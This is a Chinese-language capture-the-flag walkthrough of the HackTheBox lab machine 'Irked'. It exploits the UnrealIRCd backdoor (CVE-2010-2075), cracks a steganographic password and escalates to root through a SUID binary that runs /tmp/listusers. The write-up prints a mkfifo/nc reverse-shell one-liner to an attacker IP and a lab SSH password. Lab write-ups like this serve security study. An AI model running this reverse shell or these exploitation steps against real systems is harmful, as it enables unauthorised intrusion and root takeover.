## 阶段1：枚举

开局还是常规 nmap 进行端口和服务的识别：

```






















































# Nmap 7.91 scan initiated Thu May  6 08:54:23 2021 as: nmap -p- -oA nmap/AllPort -T4 -v --min-rate 1000 10.10.10.117
```

从扫描信息上我们获悉 `Host: irked.htb`，存在 ssh 服务、 http 服务和 irc 服务。

浏览器查看下，就一张图片：

## 阶段2：工具和利用

### 阶段2.1：发现存在密码的隐写文件

下载后使用 `stegsolve.jar`、`steghide` 分析一下看看是否存在隐写，发现需要获得密码才能解数据：

![](../Images/5a9ec5ae1cb640a7b0ac9114e35bc7db.png)

尝试其他的信息获取：

```








































$ whatweb -v http://10.10.10.117                                                                                                                         
```

通过 whatweb 没有获取到更多有用的信息，尝试 exploit-db 搜索。

### 阶段2.2：利用 CVE-2010-2075

关键字：`unrealircd exploit github` 获悉到一个漏洞编号 CVE-2010-2075。

> 从2009年11月到2010年6月在某些镜像站点上分发的UnrealIRCd 3.2.8.1在DEBUG3\_DOLOG\_SYSTEM宏中包含一个外部引入的修改（特洛伊木马），允许远程攻击者执行任意命令。

根据CVE编号找漏洞脚本：`https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/master/exploit.py`

![](../Images/fa4f12e0e0c62746f60f4a88484e15ac.png)

OK，成功获取到 `ircd` 身份的shell，查看目标服务器存在哪些用户目录：

```


$ ls /home
```

通过 whereis 查询到目标机器存在 ftp 命令，所以我这优先使用 `pyftpdlib` 进行文件传输。

```





kali@kali ~$ python3 -m pyftpdlib -p 21 -w
```

![](../Images/bbe15c511d3af7415f85b67e29d7800c.png)

### 阶段2.3：djmardov用户登录

在运行 `linpeas` 的同时，查询下 `djmardov` 用户存在哪些文件和目录：

![](../Images/d72acf228c1740e788731090565b4a44.png)

找到了 user flag，同时发现 `.backup` 文件获得一组密码。

```


$ cat .backup
```

用这组密码进行 `su` 切换用户失败，`ssh` 碰撞也失败，解隐写图片成功了：

![](../Images/7b12319fa38fcca732097faf1ead215c.png)

在 `pass.txt` 中得到新的密码：`Kab6h+m+bbp2J:HG`，通过新密码成功登录 `djmardov` 用户。

![](../Images/7b96e7e20a150195cc0f85b664782d68.png)

## 阶段3：权限提升

通过 linpeas 辅助分析，发现存在一个可以的本地服务 631 端口：  
![](../Images/c5ada36baf9d83036e8734f9c49d8f81.png)

尝试将端口进行映射，查看它运行的服务（这里我用的ssh映射，将本地的631转到对外1337端口）：

```
# sshpass -p 'Kab6h+m+bbp2J:HG' ssh djmardov@10.10.10.117 -L 1337:127.0.0.1:631
```

![](../Images/0808dcfb14330415d38789eadb7655d1.png)

额，没见过这个服务，暂时不明。接着看 linpeas，发现存在一个不明的 `SUID` 权限的命令 `/usr/bin/viewuser`

![](../Images/c02392bdd197de96f727a4cdde03ecaf.png)

尝试执行下：

![](../Images/293e51566cc5c891ca1935eddf391ff9.png)

结果显示类似执行了查询用户在线的命令，留意到最后显示：`sh: 1: /tmp/listusers: not found`，这种信息一般是通过 `sh` 去运行某个文件但文件不存在才出现的提示。

尝试利用，写入一个反弹shell，然后执行：

```

$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.9 9900 >/tmp/f" > /tmp/listusers
```

![](../Images/733a734517c99343ab994e4346a421e5.png)

额，成功获得root身份的shell。前面的 `bash` 利用写错了，正常应该是 `bash -c '<里面的才是bash -i>'`，可能是打的太晚了当时脑子有点糊涂…

而 `viewuser` 的二进制分析可看这个：https://fuzzmymind.com/2019/05/29/suid-binary-exploit-a-primer/
